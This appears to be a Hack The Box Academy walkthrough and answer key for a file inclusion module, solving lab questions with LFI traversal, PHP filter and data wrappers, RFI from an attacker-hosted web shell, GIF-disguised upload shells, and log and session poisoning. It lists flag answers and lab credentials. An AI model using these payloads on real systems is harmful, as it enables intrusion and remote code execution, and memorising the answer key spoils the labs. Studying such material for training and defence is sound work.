![[cheatsheat-File Inclusion]]


## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Local File Inclusion (LFI)|Question 1|barry|
|Local File Inclusion (LFI)|Question 2|HTB{n3v3r_tru$t_u$3r_!nput}|
|Basic Bypasses|Question 1|HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}|
|PHP Filters|Question 1|HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}|
|PHP Wrappers|Question 1|HTB{d!$46l3_r3m0t3_url_!nclud3}|
|Remote File Inclusion (RFI)|Question 1|99a8fc05f033f2fc0cf9a6f9826f83f4|
|LFI and File Uploads|Question 1|HTB{upl04d+lf!+3x3cut3=rc3}|
|Log Poisoning|Question 1|/var/www/html|
|Log Poisoning|Question 2|HTB{1095_5#0u1d_n3v3r_63_3xp053d}|
|Automated Scanning|Question 1|HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}|
|File Inclusion Prevention|Question 1|/etc/php/7.4/apache2/php.ini|
|File Inclusion Prevention|Question 2|security|
|Skills Assessment - File Inclusion|Question 1|eedbb78d4800aa45573840ed6bd2d1e3|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Local File Inclusion (LFI)

## Question 1

### "Using the file inclusion find the name of a user on the system that starts with "b"."

Many approaches can be taken to solve this question.

A first approach is whereby students use `cURL` through the command line to exploit the file inclusion vulnerability and retrieve the contents of the `/etc/passwd` file, then subsequently use `grep` to filter out the answer:

Code: shell

```shell
curl -s "http://STMIP:STMPO/index.php?language=../../../../etc/passwd" | grep ^b
```

```shell-session
┌─[eu-academy-2]─[10.10.14.227]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s "http://64.227.39.88:32225/index.php?language=../../../../etc/passwd" | grep ^b

bin:x:2:2:bin:/bin:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
barry:x:1000:1000::/home/barry:/bin/bash
```

A second approach is a manual one, whereby students use the browser only, visiting and viewing the source of the webpage to attain the answer `barry`:

```shell-session
view-source:http://STMIP:STMPO/basic/index.php?language=../../../../etc/passwd
```

![File_Inclusion_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_1.png)

Answer: `barry`

# Local File Inclusion (LFI)

## Question 2

### "Submit the contents of the flag.txt file located in the /usr/share/flags directory."

Students need to use a payload that exploits the path traversal vulnerability to read the contents of the file "flag.txt" located in `/usr/share/flags/flag.txt`:

```shell-session
http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt
```

![File_Inclusion_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_2.png)

Alternatively, students can use `cURL` and pipe its output to `grep` to filter the answer `HTB{n3v3r_tru$t_u$3r_!nput}` out:

Code: shell

```shell
curl -s "http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt" | grep "HTB"
```

```shell-session
curl -s "http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt" | grep "HTB" 

HTB{n3v3r_tru$t_u$3r_!nput}
```

Answer: `HTB{n3v3r_tru$t_u$3r_!nput}`

# Basic Bypasses

## Question 1

### "The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt"

The web application of the spawned target machine does not recursively remove `../` since it applies a non-recursive path traversal filter. Using the browser, students can bypass the filter by using a recursive LFI payload such as `....//`:

```shell-session
http://STMIP:STMPO/index.php?language=languages/....//....//....//....//....//flag.txt
```

![File_Inclusion_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_3.png)

Alternatively, students can use `cURL` with a different recursive LFI payload `..././` and then filter out the flag `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}` using `grep`:

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=languages/..././..././..././..././..././flag.txt' | grep 'HTB'
```

```shell-session
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://159.65.81.40:30593/index.php?language=languages/..././..././..././..././..././flag.txt' | grep 'HTB'

HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
```

Answer: `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

# PHP Filters

## Question 1

### "Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer"

Students first need to use `Ffuf` to fuzz for `.php` scripts/files on the spawned target machine website's root page:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://STMIP:STMPO/FUZZ.php
```

```shell-session
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://134.209.186.158:30757/FUZZ.php

en
es
index
configure
```

Out of the four, `configure.php` seems to be the most useful/juicy since it might contain configuration settings, thus, students need to use the `convert.base64-encode` filter to retrieve the contents of the file as base64:

```shell-session
http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

![File_Inclusion_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_4.png)

At last, students need to decode the base64 string, to find the flag as the value of `DB_PASSWORD`, which is `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`:

Code: shell

```shell
echo -n 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo -n 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d

<?php
<SNIP>
$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

Answer: `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

# PHP Wrappers

## Question 1

### "Try to gain RCE using one of the PHP wrappers and read the flag at /"

Many approaches can be taken to solve this question.

A first approach is whereby students use the `data` wrapper to include a PHP web shell. But first, to determine whether the `allow_url_include` setting is enabled, students need to check the PHP configuration file of the `Apache` server using the `convert.base64-encode` filter:

```shell-session
http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

![File_Inclusion_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_5.png)

The base64-encoded string is extremely large, thus, using some Linux-Fu, students are encouraged to filter out all HTML tags (using `grep` and `sed`) to remain with the base64-encoded string only, and then save it to a file for easier usage afterwards (instead of just copying and pasting the string manually):

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.81.30:30918/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
```

Students then need to decode the base64-encoded string and use `grep` to filter for the `allow_url_include` option:

Code: shell

```shell
cat configBase64.txt | base64 -d | grep 'allow_url_include'
```

```shell-session
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat configBase64.txt | base64 -d | grep 'allow_url_include'

allow_url_include = On
```

Since this option is enabled, the `data` wrapper can be used. Students first need to base64-encode a basic PHP web shell:

Code: shell

```shell
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```shell-session
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Students now need to URL-encode the base64-encoded web shell, which can be achieved via Python3 (or by using `cURL` itself, as with the `--data-urlencode` flag, or with any online website such as [urlencoder](https://www.urlencoder.org/)):

Code: shell

```shell
python3 -c 'import urllib.parse;print(urllib.parse.quote_plus("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
```

```shell-session
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

And then, students need to pass it to the `data` wrapper with `data://text/plain;base64,`, passing commands as the value for the `cmd` URL-parameter. First, `ls` will be used on the root directory `/` to view the files there (`grep` is also used to take out anything that is an HTML tag from the response returned by `cURL`):

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
```

```shell-session
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.81.30:30980/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"

37809e2f8952f06139011994726d9ef1.txt
bin
boot
dev
etc
home
<SNIP>
```

The first file `37809e2f8952f06139011994726d9ef1.txt` seems to contain the flag, thus, students need to use the `cat` command on it:

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' | grep -v "<.*>"
```

```shell-session
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.81.30:30980/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' | grep -v "<.*>"

HTB{d!$46l3_r3m0t3_url_!nclud3}
```

Answer: `HTB{d!$46l3_r3m0t3_url_!nclud3}`

# Remote File Inclusion (RFI)

## Question 1

### "Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /"

Students first need to create a PHP web shell which they will invoke/include later when exploiting the RFI vulnerability:

Code: php

```php
<?php system($_GET['cmd']); ?>
```

Code: shell

```shell
cat << 'EOF' > webShell.php
<?php system($_GET['cmd']); ?>
EOF
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ cat << 'EOF' > webShell.php
> <?php system($_GET['cmd']); ?>
> EOF
```

Then, students need to start an HTTP server on `Pwnbox`/`PMVPN` (in the same directory where the PHP web shell exists) to listen and respond to requests from the spawned target machine (it is important that students make sure the firewall on `PMVPN` is not denying/rejecting incoming connections):

Code: shell

```shell
python3 -m http.server
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students will exploit the RFI vulnerability and list all the files in the root directory (`PWNIP` here is the IP address of the interface `tun0`, students can use the command `ip a | grep 'tun0'` to find out the IP address):

Code: shell

```shell
curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"
```

```shell-session
┌──[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.4:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"

bin
boot
dev
etc
exercise
<SNIP>
```

The `/exercise/` directory seems promising, thus, students need to list its contents:

Code: shell

```shell
curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:PWNPO/webShell.php&cmd=ls+/exercise/' | grep -v "<.*>"
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.4:8000/webShell.php&cmd=ls+/exercise/' | grep -v "<.*>"

flag.txt
```

The flag exists in the `/exercise/` directory, therefore at last, students need to print its content:

Code: shell

```shell
curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:PWNPO/webShell.php&cmd=cat+/exercise/flag.txt' | grep -v "<.*>"
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.4:8000/webShell.php&cmd=cat+/exercise/flag.txt' | grep -v "<.*>"

99a8fc05f033f2fc0cf9a6f9826f83f4
```

Answer: `99a8fc05f033f2fc0cf9a6f9826f83f4`

# LFI and File Uploads

## Question 1

### "Use any of the techniques covered in this section to gain RCE and read the flag at /"

Students can use any of the three techniques mentioned in the module's section. The `Image Upload` (i.e., first technique) will be used to solve this question.

Students first need to create a PHP web shell that has the `GIF8` image magic byte at the beginning of it, and save it to a file with the `.gif` extension:

Code: shell

```shell
cat << 'EOF' > shell.gif
GIF8<?php system($_GET['cmd']); ?>
EOF
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat << 'EOF' > shell.gif
> GIF8<?php system($_GET['cmd']); ?>
> EOF
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ file shell.gif

shell.gif: GIF image data 26736 x 8304
```

Then, students need to upload the malicious image file by navigating to `http://STMIP:STMPO/settings.php`, clicking on the "image" icon to choose the file, and then clicking on "Upload":

![File_Inclusion_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_6.png)

![File_Inclusion_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_7.png)

After the malicious image has been uploaded successfully, students need to view the page source to notice that on line 29, the uploaded file path is `/profile_images/shell.gif`:

![File_Inclusion_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_8.png)

Now, remote code execution is possible; students need to use the `ls` command to list the contents at the root directory `/`:

Code: shell

```shell
curl -s -w "\n" 'http://STMIP:STMPO/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w "\n" 'http://165.22.122.134:30504/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"

GIF82f40d853e2d4768d87da1c81772bae0a.txt
bin
boot
dev
etc
home
<SNIP>
```

The first file holds the flag, however, students need to remove `GIF8` from the beginning of it and use the `cat` command on it:

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt' | grep -v "<.*>"
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://165.22.122.134:30504/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt' | grep -v "<.*>"

GIF8HTB{upl04d+lf!+3x3cut3=rc3}
```

The printed string also has `GIF8` at the beginning of it, thus, students need to remove it before submitting the flag `HTB{upl04d+lf!+3x3cut3=rc3}`.

Answer: `HTB{upl04d+lf!+3x3cut3=rc3}`

# Log Poisoning

## Question 1

### "Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd"

Students need to either start with the `PHP Session Poisoning` technique or `Server Log Poisoning`.

Starting with the former method, students need to examine the `PHPSESSID` session file and see if it contains any data that can be controlled and poisoned. To do so, students need to know the `PHPSESSID` cookie value, which can be attained via the Web Developer Tools of a browser:

![File_Inclusion_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_9.png)

The `PHPSESSID` cookie value is `iic5bp46saajhe9jtshind2vsh`, thus, it should be stored at `/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh` on the back-end server. Students then need to include the session file through the LFI vulnerability to view its contents:

```shell-session
http://STMIP:STMPO/index.php?language=/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh
```

![File_Inclusion_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_10.png)

Afterward, students need to try to poison the session file and then include it through the LFI vulnerability to view its contents and whether the value of `page` has been changed:

```shell-session
http://STMIP:STMPO/index.php?language=poisonTest
```

![File_Inclusion_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_11.png)

The session file was poisoned with the string "poisonTest" successfully, thus, students now need to poison it with a basic URL-encoded PHP web shell to attain remote code execution on the spawned target machine:

```shell-session
http://STMIP:STMPO/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

At last, students need to execute the `pwd` command by passing it to the `cmd` URL parameter to attain the flag `/var/www/html`:

```shell-session
http://STMIP:STMPO/index.php?language=/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh&cmd=pwd
```

![File_Inclusion_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_12.png)

Answer: `/var/www/html`

# Log Poisoning

## Question 2

### "Try to use a different technique to gain RCE and read the flag at /"

Students here need to use the second technique which is `Server Log Poisoning`.

First, students need to determine whether the web server running on the back-end is `Apache` or `Nginx`. When including the `access.log` file of `Apache` through the LFI vulnerability its output is returned:

```shell-session
http://STMIP:STMPO/index.php?language=/var/log/apache2/access.log
```

![File_Inclusion_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_13.png)

Thus, `Apache` is running on the back-end server. Students now need to poison the `User-Agent` header. To do so, students need to use an intercepting proxy such as Burp Suite to capture the request that includes the `Apache` log file through the LFI vulnerability and poison the `User-Agent` header to be a PHP web shell:

Code: php

```php
<?php system($_GET['cmd']); ?>
```

![File_Inclusion_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_14.png)

After forwarding the poisoned request, students can execute commands, then, they need to list the files at the root directory `/`:

```shell-session
GET /index.php?language=/var/log/apache2/access.log&cmd=ls+/ HTTP/1.1
```

![File_Inclusion_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_15.png)

The name of the file containing the flag is `c85ee5082f4c723ace6c0796e3a3db09.txt`, therefore, students need to print its contents to attain the flag `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`:

```shell-session
GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
```

![File_Inclusion_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_16.png)

Answer: `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

# Automated Scanning

## Question 1

### "Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt"

First, students need to use `Ffuf` to fuzz for common GET parameters, however, the response size of erroneous requests must be determined to subsequently be filtered. Identifying the response size of an erroneous request can be easily achieved by running `Ffuf` without response size filtering and noticing the size of the responses:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://STMIP:STMPO/index.php?FUZZ=key'
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?FUZZ=key'

post                    [Status: 200, Size: 2309, Words: 571, Lines: 56]
p                       [Status: 200, Size: 2309, Words: 571, Lines: 56]
file                    [Status: 200, Size: 2309, Words: 571, Lines: 56]
key                     [Status: 200, Size: 2309, Words: 571, Lines: 56]
debug                   [Status: 200, Size: 2309, Words: 571, Lines: 56]
<SNIP>
```

The response size is `2309` for all of the responses, thus, students now need to filter out this response size by using the `-fs` flag:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://STMIP:STMPO/index.php?FUZZ=key' -fs 2309
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?FUZZ=key' -fs 2309

view [Status: 200, Size: 1935, Words: 515, Lines: 56]
:: Progress: [2588/2588] :: Job [1/1] :: 6221 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

`view` is a valid GET parameter. Thus, students now need to use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) LFI wordlist to fuzz for LFI payloads. Similar to fuzzing for common GET parameters, the response size of erroneous requests must be determined to subsequently get filtered:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://STMIP:STMPO/index.php?view=FUZZ'
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?view=FUZZ'

/.../.../.../.../.../   [Status: 200, Size: 1935, Words: 515, Lines: 56]
%00../../../../../../etc/passwd [Status: 200, Size: 1935, Words: 515, Lines: 56]
%00/etc/passwd%00       [Status: 200, Size: 1935, Words: 515, Lines: 56]
/apache/logs/error.log  [Status: 200, Size: 1935, Words: 515, Lines: 56]
<SNIP>
```

The response size is `1935` for any of the erroneous requests, thus, students need to filer out this response size:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://STMIP:STMPO/index.php?view=FUZZ' -fs 1935
```

```shell-session
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?view=FUZZ' -fs 1935

../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
:: Progress: [870/870] :: Job [1/1] :: 863 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Students at last can use any of the LFI payloads returned by `Ffuf` to read the flag, one example would be using the last payload (which has the least amount of `../`):

```shell-session
http://STMIP:STMPO/?view=../../../../../../../../../../../../../../../../../flag.txt
```

![File_Inclusion_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_17.png)

Answer: `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

# File Inclusion Prevention

## Question 1

### "What is the full path to the php.ini file for Apache?"

Students first need to SSH into the spawned target machine using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-co8vkqsbet]─[~]
└──╼ [★]$ ssh htb-student@10.129.29.112

The authenticity of host '10.129.29.112 (10.129.29.112)' can't be established.
ECDSA key fingerprint is SHA256:9+kS921cMi3Ewl3ZoHPei3saVgPGC5oQv5/SsV4DBB4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.29.112' (ECDSA) to the list of known hosts.

htb-student@10.129.29.112's password: 

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

<SNIP>

htb-student@lfi-harden:~$
```

Then, students need to run as root -which has the same password as the normal user- the `find` command and specify `php.ini` as the name of the file being searched for:

Code: shell

```shell
sudo find / -name php.ini
```

```shell-session
htb-student@lfi-harden:~$ sudo find / -name php.ini

/etc/php/7.4/cli/php.ini 
/etc/php/7.4/apache2/php.ini
```

The first path specifies the file for the `CLI` PHP program. However, the second path specifies the path for the PHP plugin used by the `Apache` web server. Thus, the second path, `/etc/php/7.4/apache2/php.ini`, is the correct answer.

Answer: `/etc/php/7.4/apache2/php.ini`

# File Inclusion Prevention

## Question 2

### "Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for \_\_\_\_\_\_\_\_ reasons."

Utilizing the same SSH connection established in the previous question, students for the first part of this question first need to edit the file `/etc/php/7.4/apache2/php.ini` by going to line 312, and making the `disable_functions` directive to be:

```shell-session
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

![File_Inclusion_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_18.png)

Then, students need to restart `Apache`:

Code: shell

```shell
sudo service apache2 restart
```

```shell-session
htb-student@lfi-harden:/var/www/html$ sudo service apache2 restart
```

Subsequently, students need to make a web shell named "shell.php" in `/var/www/html/` as root (supplying the password `HTB_@cademy_stdnt!` when prompted for it):

Code: shell

```shell
sudo su -
echo "<?php system('id'); ?>" > /var/www/html/shell.php
```

```shell-session
htb-student@lfi-harden:/var/www/html$ sudo su -

[sudo] password for htb-student: 
root@lfi-harden:/var/www/html# echo "<?php system('id'); ?>" > /var/www/html/shell.php
```

Students then need to use `tail` with the `follow` flag (`-f`) on the file `/var/log/apache2/error.log`:

Code: shell

```shell
sudo tail -f /var/log/apache2/error.log
```

```shell-session
htb-student@lfi-harden:/var/www/html$ sudo tail -f /var/log/apache2/error.log
```

![File_Inclusion_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_19.png)

